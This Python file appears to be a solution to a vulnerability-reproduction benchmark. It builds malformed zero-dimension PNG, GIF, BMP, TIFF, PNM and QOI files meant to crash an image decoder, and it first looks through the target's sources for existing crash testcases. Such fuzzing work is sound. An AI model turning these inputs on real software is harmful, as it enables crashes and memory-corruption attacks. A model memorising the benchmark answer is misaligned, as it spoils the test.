import os
import re
import tarfile
import tempfile
import zlib
from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Tuple


def _u32be(x: int) -> bytes:
    return int(x & 0xFFFFFFFF).to_bytes(4, "big", signed=False)


def _u32le(x: int) -> bytes:
    return int(x & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _u16le(x: int) -> bytes:
    return int(x & 0xFFFF).to_bytes(2, "little", signed=False)


def _crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF


def _png_chunk(ctype: bytes, data: bytes) -> bytes:
    return _u32be(len(data)) + ctype + data + _u32be(_crc32(ctype + data))


def gen_png_zero_dim(width: int = 0, height: int = 1, decompressed_len: int = 8192) -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = _u32be(width) + _u32be(height) + bytes([8, 6, 0, 0, 0])  # bitdepth=8, color=RGBA
    raw_len = max(1, int(decompressed_len))
    raw = b"\x00" + b"\x00" * (raw_len - 1)  # starts with filter=0
    comp = zlib.compress(raw, level=9)
    png = (
        sig
        + _png_chunk(b"IHDR", ihdr)
        + _png_chunk(b"IDAT", comp)
        + _png_chunk(b"IEND", b"")
    )
    return png


def gen_gif_zero_dim(width: int = 0, height: int = 1) -> bytes:
    # Minimal GIF with GCT and a single image block
    hdr = b"GIF89a"
    lsd = _u16le(width) + _u16le(height) + bytes([0x80 | 0x70 | 0x00]) + b"\x00" + b"\x00"
    gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"
    img_desc = b"\x2C" + _u16le(0) + _u16le(0) + _u16le(width) + _u16le(height) + b"\x00"
    # LZW data (standard minimal stream used by tiny gifs)
    img_data = b"\x02" + b"\x02" + b"\x4C\x01" + b"\x00"
    trailer = b"\x3B"
    return hdr + lsd + gct + img_desc + img_data + trailer


def gen_bmp_zero_dim(width: int = 0, height: int = 1) -> bytes:
    # BITMAPFILEHEADER (14) + BITMAPINFOHEADER (40) + some data
    bfType = b"BM"
    bfOffBits = 14 + 40
    pixel_data = b"\x00" * 16
    bfSize = bfOffBits + len(pixel_data)
    filehdr = bfType + _u32le(bfSize) + _u16le(0) + _u16le(0) + _u32le(bfOffBits)
    bihdr = (
        _u32le(40)
        + int(width).to_bytes(4, "little", signed=True)
        + int(height).to_bytes(4, "little", signed=True)
        + _u16le(1)
        + _u16le(24)
        + _u32le(0)
        + _u32le(len(pixel_data))
        + _u32le(2835)
        + _u32le(2835)
        + _u32le(0)
        + _u32le(0)
    )
    return filehdr + bihdr + pixel_data


def gen_tiff_zero_dim(width: int = 0, height: int = 1, strip_byte_counts: int = 1) -> bytes:
    # Minimal baseline TIFF, little-endian, single strip, uncompressed
    # Tags: ImageWidth, ImageLength, BitsPerSample, Compression, Photometric, StripOffsets,
    #       SamplesPerPixel, RowsPerStrip, StripByteCounts
    endian = b"II"
    magic = b"\x2A\x00"
    ifd_offset = _u32le(8)
    header = endian + magic + ifd_offset

    entries: List[bytes] = []

    def add_tag(tag: int, typ: int, count: int, value_or_offset: int) -> None:
        entries.append(_u16le(tag) + _u16le(typ) + _u32le(count) + _u32le(value_or_offset))

    # Compute IFD size to place image data right after IFD
    num_entries = 9
    ifd_size = 2 + num_entries * 12 + 4
    img_data_offset = 8 + ifd_size

    add_tag(256, 4, 1, int(width) & 0xFFFFFFFF)         # ImageWidth LONG
    add_tag(257, 4, 1, int(height) & 0xFFFFFFFF)        # ImageLength LONG
    add_tag(258, 3, 1, 8)                               # BitsPerSample SHORT=8
    add_tag(259, 3, 1, 1)                               # Compression SHORT=1
    add_tag(262, 3, 1, 1)                               # Photometric SHORT=1
    add_tag(273, 4, 1, img_data_offset)                 # StripOffsets LONG
    add_tag(277, 3, 1, 1)                               # SamplesPerPixel SHORT=1
    add_tag(278, 4, 1, 1)                               # RowsPerStrip LONG=1
    add_tag(279, 4, 1, int(strip_byte_counts) & 0xFFFFFFFF)  # StripByteCounts LONG

    ifd = _u16le(num_entries) + b"".join(entries) + _u32le(0)
    img_data = b"\x00" * max(0, int(strip_byte_counts))
    return header + ifd + img_data


def _is_text_path(name: str) -> bool:
    n = name.lower()
    return any(
        n.endswith(ext)
        for ext in (
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift",
            ".py", ".js", ".ts", ".cmake", ".mk", ".in",
            ".txt", ".md", ".rst", ".yaml", ".yml", ".toml",
            ".bazel", "build.sh", "configure.ac", "configure.in", "makefile",
        )
    )


def _iter_tar_members(src_path: str) -> Iterable[Tuple[str, int, callable]]:
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            size = m.size
            def _reader(m=m, tf=tf):
                f = tf.extractfile(m)
                if f is None:
                    return b""
                return f.read()
            yield name, size, _reader


def _iter_dir_files(src_path: str) -> Iterable[Tuple[str, int, callable]]:
    for root, _, files in os.walk(src_path):
        for fn in files:
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if not os.path.isfile(p):
                continue
            rel = os.path.relpath(p, src_path)
            size = st.st_size
            def _reader(p=p):
                try:
                    with open(p, "rb") as f:
                        return f.read()
                except OSError:
                    return b""
            yield rel, size, _reader


def _iter_files(src_path: str) -> Iterable[Tuple[str, int, callable]]:
    if os.path.isdir(src_path):
        yield from _iter_dir_files(src_path)
        return
    yield from _iter_tar_members(src_path)


def _detect_png_dims(data: bytes) -> Optional[Tuple[int, int]]:
    if len(data) < 33:
        return None
    if not data.startswith(b"\x89PNG\r\n\x1a\n"):
        return None
    off = 8
    if off + 8 > len(data):
        return None
    try:
        ln = int.from_bytes(data[off:off + 4], "big")
        ctype = data[off + 4:off + 8]
        if ctype != b"IHDR":
            return None
        if off + 8 + ln > len(data):
            return None
        ihdr = data[off + 8:off + 8 + ln]
        if len(ihdr) < 8:
            return None
        w = int.from_bytes(ihdr[0:4], "big")
        h = int.from_bytes(ihdr[4:8], "big")
        return w, h
    except Exception:
        return None


def _detect_gif_dims(data: bytes) -> Optional[Tuple[int, int]]:
    if len(data) < 10:
        return None
    if not (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
        return None
    w = int.from_bytes(data[6:8], "little")
    h = int.from_bytes(data[8:10], "little")
    return w, h


def _detect_bmp_dims(data: bytes) -> Optional[Tuple[int, int]]:
    if len(data) < 26:
        return None
    if not data.startswith(b"BM"):
        return None
    # BITMAPINFOHEADER expected at offset 14; width/height at 18/22 from file start
    try:
        w = int.from_bytes(data[18:22], "little", signed=True)
        h = int.from_bytes(data[22:26], "little", signed=True)
        return int(w), int(h)
    except Exception:
        return None


def _detect_qoi_dims(data: bytes) -> Optional[Tuple[int, int]]:
    if len(data) < 14:
        return None
    if data[0:4] != b"qoif":
        return None
    w = int.from_bytes(data[4:8], "big")
    h = int.from_bytes(data[8:12], "big")
    return w, h


def _detect_pnm_dims(data: bytes) -> Optional[Tuple[int, int]]:
    if len(data) < 3:
        return None
    if data[0:1] != b"P" or data[1:2] not in b"123456":
        return None
    # Parse ASCII tokens, skipping comments
    try:
        s = data[:4096].decode("latin1", errors="ignore")
    except Exception:
        return None
    i = 0
    tokens: List[str] = []
    while i < len(s) and len(tokens) < 4:
        c = s[i]
        if c.isspace():
            i += 1
            continue
        if c == "#":
            j = s.find("\n", i)
            if j == -1:
                break
            i = j + 1
            continue
        j = i
        while j < len(s) and not s[j].isspace():
            j += 1
        tokens.append(s[i:j])
        i = j
    if len(tokens) < 3:
        return None
    if tokens[0] not in ("P1", "P2", "P3", "P4", "P5", "P6"):
        return None
    w = int(tokens[1], 10)
    h = int(tokens[2], 10)
    return w, h


def _detect_tiff_dims(data: bytes) -> Optional[Tuple[int, int]]:
    if len(data) < 8:
        return None
    if data[:2] == b"II" and data[2:4] == b"\x2A\x00":
        endian = "little"
    elif data[:2] == b"MM" and data[2:4] == b"\x00\x2A":
        endian = "big"
    else:
        return None
    try:
        ifd0 = int.from_bytes(data[4:8], endian)
        if ifd0 <= 0 or ifd0 + 2 > len(data):
            return None
        n = int.from_bytes(data[ifd0:ifd0 + 2], endian)
        base = ifd0 + 2
        w = None
        h = None
        for k in range(n):
            off = base + k * 12
            if off + 12 > len(data):
                break
            tag = int.from_bytes(data[off:off + 2], endian)
            typ = int.from_bytes(data[off + 2:off + 4], endian)
            count = int.from_bytes(data[off + 4:off + 8], endian)
            val = data[off + 8:off + 12]
            if count != 1:
                continue
            if tag not in (256, 257):
                continue
            if typ == 3:  # SHORT
                v = int.from_bytes(val[:2], endian)
            elif typ == 4:  # LONG
                v = int.from_bytes(val, endian)
            else:
                continue
            if tag == 256:
                w = v
            else:
                h = v
            if w is not None and h is not None:
                return int(w), int(h)
        return None
    except Exception:
        return None


def detect_format_and_dims(data: bytes) -> Optional[Tuple[str, int, int]]:
    for fmt, fn in (
        ("png", _detect_png_dims),
        ("gif", _detect_gif_dims),
        ("bmp", _detect_bmp_dims),
        ("tiff", _detect_tiff_dims),
        ("qoi", _detect_qoi_dims),
        ("pnm", _detect_pnm_dims),
    ):
        r = fn(data)
        if r is not None:
            w, h = r
            return fmt, int(w), int(h)
    return None


@dataclass
class _FormatScore:
    fmt: str
    score: int = 0


def _guess_format_from_sources(src_path: str) -> str:
    scores: Dict[str, _FormatScore] = {k: _FormatScore(k, 0) for k in ("png", "tiff", "gif", "bmp", "pnm", "qoi")}
    magic_pat = {
        "png": [r"\\x89PNG", r"PNG\\r\\n\\x1a\\n", r"\bIHDR\b", r"\bIDAT\b", r"<png\.h>", r"png_read", r"lodepng", r"spng_"],
        "tiff": [r"TIFF", r"<tiffio\.h>", r"TIFFOpen", r"TIFFRead", r"TIFFRGBAImage"],
        "gif": [r"GIF89a", r"GIF87a", r"DGif", r"EGif", r"giflib"],
        "bmp": [r"\bBMP\b", r"BITMAP", r"biWidth", r"biHeight"],
        "pnm": [r"\bP6\b", r"\bPPM\b", r"\bPGM\b", r"\bPBM\b", r"\bPNM\b"],
        "qoi": [r"\bqoi\b", r"qoif", r"qoi_decode", r"qoi_read"],
    }

    fuzzish = re.compile(r"(fuzz|fuzzer)", re.IGNORECASE)

    total_read = 0
    max_total = 20_000_000  # cap read across files

    for name, size, reader in _iter_files(src_path):
        lname = name.lower()
        if not _is_text_path(lname):
            continue
        # Prefer fuzzer-related sources, but still sample some build/docs files
        if not (fuzzish.search(lname) or lname.endswith(("cmakelists.txt", "configure.ac", "makefile", "build.sh", "meson.build"))):
            continue
        if size <= 0 or size > 1_500_000:
            continue
        if total_read + size > max_total:
            continue
        b = reader()
        total_read += len(b)
        try:
            s = b.decode("utf-8", errors="ignore")
        except Exception:
            s = b.decode("latin1", errors="ignore")
        sl = s.lower()
        # filename hints
        for fmt in scores:
            if fmt in lname:
                scores[fmt].score += 50
        # content hints
        for fmt, pats in magic_pat.items():
            for p in pats:
                if re.search(p, s):
                    scores[fmt].score += 10
            # also lowercase substring quick checks
            if fmt in ("png", "gif", "bmp", "tiff", "qoi", "pnm"):
                if fmt in sl:
                    scores[fmt].score += 1

    best = max(scores.values(), key=lambda x: x.score)
    if best.score <= 0:
        return "png"
    return best.fmt


def _try_find_existing_poc(src_path: str) -> Optional[bytes]:
    name_markers = ("crash", "poc", "repro", "testcase", "clusterfuzz", "oss-fuzz", "issue")
    exts = (".png", ".gif", ".bmp", ".tif", ".tiff", ".pnm", ".ppm", ".pgm", ".pbm", ".qoi", ".jpg", ".jpeg", ".webp", ".ico", ".cur")
    candidates: List[Tuple[int, bytes]] = []

    max_files = 4000
    scanned = 0

    for name, size, reader in _iter_files(src_path):
        if scanned >= max_files:
            break
        scanned += 1
        lname = name.lower()
        if size <= 0 or size > 200_000:
            continue
        if not (any(m in lname for m in name_markers) or lname.endswith(exts)):
            continue
        data = reader()
        if not data:
            continue
        d = detect_format_and_dims(data)
        if d is None:
            continue
        fmt, w, h = d
        if w == 0 or h == 0:
            candidates.append((len(data), data))

    if not candidates:
        return None
    candidates.sort(key=lambda x: x[0])
    return candidates[0][1]


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = _try_find_existing_poc(src_path)
        if poc is not None:
            return poc

        fmt = _guess_format_from_sources(src_path)

        if fmt == "png":
            return gen_png_zero_dim(width=0, height=1, decompressed_len=8192)
        if fmt == "tiff":
            return gen_tiff_zero_dim(width=0, height=1, strip_byte_counts=1)
        if fmt == "gif":
            return gen_gif_zero_dim(width=0, height=1)
        if fmt == "bmp":
            return gen_bmp_zero_dim(width=0, height=1)
        if fmt == "pnm":
            # P6 with zero width and some trailing bytes
            return b"P6\n0 1\n255\n" + (b"\x00" * 16)
        if fmt == "qoi":
            # Basic QOI header with zero width; include some payload
            # Signature 'qoif' + w + h + channels + colorspace
            return b"qoif" + _u32be(0) + _u32be(1) + b"\x04\x00" + (b"\x00" * 64)

        return gen_png_zero_dim(width=0, height=1, decompressed_len=8192)